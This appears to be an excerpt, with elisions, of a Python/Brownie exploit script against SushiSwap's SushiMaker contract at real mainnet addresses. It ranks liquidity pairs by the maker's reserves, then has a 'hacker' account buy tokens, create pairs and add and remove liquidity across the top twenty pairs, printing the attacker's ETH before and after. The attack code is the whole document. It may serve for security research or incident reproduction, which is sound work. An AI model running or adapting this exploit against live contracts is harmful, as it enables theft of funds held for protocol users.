...
sushi_maker = interface.SushiMaker("0x6684977bBED67e101BB80Fc07fCcfba655c0a64F")
sushi_router = interface.SushiRouter("0xd9e1ce17f2641f24ae83637ab66a2cca9c378b9f")
...
def main():
    ...
    pairs = []
    if os.path.exists("reports/pairs.json"):
        with open("reports/pairs.json", "r") as f:
            pairs = json.load(f)
    if not pairs:
        for i in track(
            range(sushi_factory.allPairsLength()), description="Geting all pairs..."
        ):
            ...
            pairs.append(
                {
                    ...
                    "maker_reserve": pair.balanceOf(sushi_maker),
                }
            )
    ...
    pairs = sorted(pairs, key=lambda x: x["price"] * x["maker_reserve"], reverse=True)
    pairs = list(
        filter(lambda x: x["price"] > 0 and x["maker_reserve"] > 100000000, pairs)
    )
    # with open('tmp.json', 'w') as f:
    #     json.dump(pairs, f, indent=4)
    profit = 0
    for pair in track(pairs[:20], description="Exploiting pairs..."):
        try:
...
def good_luck(token0, token1):
    print(f"[before] Attacker's ETH: {web3.fromWei(hacker.balance(), 'ether')}")
    ...
    if sushi_factory.getPair(slp, weth) == ZERO_ADDRESS:
        ...
        sushi_router.swapETHForExactTokens(
            ...
            hacker,
            chain.time() + 120,
            {"from": hacker, "value": 1e18},
        )
        sushi_router.removeLiquidity(
            token0,
            token1,
            slp.balanceOf(hacker),
            0,
            0,
            hacker,
            chain.time() + 120,
    ...
    print(f"[after] Attacker's ETH: {web3.fromWei(hacker.balance(), 'ether')}")
...
def start_up(token, amount):
    ...
    reserve_in, reserve_out = (_r0, _r1) if weth == slp.token0() else (_r1, _r0)
    ...
    sushi_router.swapETHForExactTokens(
        ...
        hacker,
        chain.time() + 120,
        {"from": hacker, "value": amount_in},
    )
    return amount_in


def add_liquidity(token0, token1, to, amount=0):
    _, _, desired_amount0, desired_amount1 = calc_liquidity(token0, token1, amount)
...
def calc_liquidity(token0, token1, amount):
    ...
    slp = interface.UniswapV2Pair(sushi_factory.getPair(token0, token1))
    _r0, _r1, _ = slp.getReserves()
    r0, r1 = (_r0, _r1) if token0 == slp.token0() else (_r1, _r0)
    ...
    if expect_amount0 < 1 or expect_amount1 < 1:
        return (
            math.ceil(amount0),
            math.ceil(amount1),
            math.ceil(desired_amount0),
            math.ceil(desired_amount1),
        )
    else:
        return (
            math.ceil(desired_amount1),
            math.ceil(expect_amount1),
            math.ceil(expect_amount0),
            math.ceil(expect_amount1 * 1.1),
        )
